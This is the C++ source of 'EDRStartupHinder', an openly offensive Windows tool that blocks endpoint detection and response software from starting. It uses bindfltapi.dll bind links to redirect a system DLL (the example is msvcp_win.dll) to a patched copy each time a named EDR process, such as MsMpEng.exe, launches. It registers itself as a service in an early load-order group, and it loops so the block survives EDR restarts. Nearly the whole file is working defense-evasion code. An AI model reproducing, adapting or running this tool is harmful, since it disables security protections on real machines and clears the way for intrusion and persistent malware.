#include <windows.h>
#include <string>
#include <iostream>

#include "BindLnk.h"
#include "Utils.h"

PtrCreateBindLink MyCreateBindLink = NULL;
PtrRemoveBindLink MyRemoveBindLink = NULL;

int wmain(int argc, wchar_t* argv[])
{
    HMODULE hBindflt = LoadLibraryW(L"bindfltapi.dll");
    if (hBindflt)
    {
        MyCreateBindLink = (PtrCreateBindLink)GetProcAddress(hBindflt, "BfSetupFilter");
        MyRemoveBindLink = (PtrRemoveBindLink)GetProcAddress(hBindflt, "BfRemoveMapping");
    }
    else
    {
        std::wcerr << std::endl;
        std::wcerr << L"OS NOT SUPPORT" << std::endl;
        return 1;
    }

	if (IsRunningAsService())
	{
		AppendLog(L"Running as a service.\n");
		std::wstring fakeLib = argv[1];
		std::wstring originalLib = argv[2];
		std::wstring edrProcess = argv[3];
		std::wstring errLog;
		//loop to ensure able to prevent EDR service auto restart
		do
		{
			while (IsProcessRunning(edrProcess) == FALSE)
			{
				Sleep(10);
			}
			//EDR started
			if (FAILED(MyCreateBindLink(0, CREATE_BIND_LINK_FLAG_NONE, originalLib.c_str(), fakeLib.c_str(), 0, NULL)))
			{
				errLog = L"CreateBindLink failed with error: " + GetLastError();
				AppendLog(errLog);
				return 1;
			}
			else
			{
				AppendLog(L"Bind link created successfully.\n");
				//wait for EDR to exit
				while (IsProcessRunning(edrProcess) == TRUE)
				{
					Sleep(10);
				}
				//EDR exited, remove bind link
				if (FAILED(MyRemoveBindLink(0, originalLib.c_str())))
				{
					errLog = L"RemoveBindLink failed with error: " + GetLastError();
					AppendLog(errLog);
					return 1;
				}
				else
				{
					AppendLog(L"Bind link removed successfully.\n");
				}
			}
			//Sleep(10);
		} while (TRUE);

        return 0;
	}
    else
    {
		//Running as normal application
        std::wcout << L"\nEDRStartupHinder: EDR Startup Blocker\n"
            << L"\nGitHub:  https://github.com/TwoSevenOneT/EDR-Redir\n"
            << L"\n  Two Seven One Three: https://x.com/TwoSevenOneT\n"
            << L"\n==========================================================\n\n";

        if (argc != 6 && argc != 2)
        {
            std::wcerr << std::endl;
            std::wcerr << L"EDRStartupHinder.exe <FakeLib> <OriginalLib> <EDRProcess> <ServiceName> <ServiceGroup>" << std::endl;
            std::wcerr << L"\nExample:" << std::endl;
            std::wcerr << L"EDRStartupHinder.exe C:\\TMP\\msvcp_win.dll C:\\Windows\\System32\\msvcp_win.dll MsMpEng.exe DusmSvc-01 TDI" << std::endl;
            std::wcerr << L"\nTo remove a link that was previously created" << std::endl;
            std::wcerr << L"EDRStartupHinder <VirtualPath>" << std::endl;
            std::wcerr << std::endl;
            return 1;
        }
		if (argc == 6)
		{
			std::wstring fakeLib = argv[1];
			std::wstring originalLib = argv[2];
			std::wstring edrProcess = argv[3];
			std::wstring serviceName = argv[4];
			std::wstring serviceGroup = argv[5];
			if (!EnsureDirectoryExists(fakeLib))
			{
				std::wcerr << L"Failed to ensure directory exists for: " << fakeLib << std::endl;
				return 1;
			}
			std::wcout << L"EnsureDirectoryExists OK!" << std::endl;
			if (CopyAndPatchFile(originalLib, fakeLib) == FALSE)
			{
				std::wcerr << L"Failed to copy and patch file." << std::endl;
				return 1;
			}
			std::wcout << L"CopyAndPatchFile OK!" << std::endl;
			std::wstring imagePath = L"%SystemRoot%\\System32\\cmd.exe /k \"" + GetCurrentProcessPath() + L" " + fakeLib + L" " + originalLib + L" " + edrProcess + L"\"";
			if (!CreateNewService(serviceName, serviceName, serviceGroup, imagePath))
			{
				std::wcerr << L"Failed to create service." << std::endl;
				return 1;
			}
			std::wcout << L"CreateNewService OK!" << std::endl;
		}
		else if (argc == 2)
		{
			std::wstring fakeLib = argv[1];
			if (FAILED(MyRemoveBindLink(0, fakeLib.c_str())))
			{
				std::wcerr << L"RemoveBindLink failed with error: " << GetLastError() << std::endl;
				return 1;
			}
			else
			{
				std::wcout << L"Bind link removed successfully." << std::endl;
			}
		}
    }
}

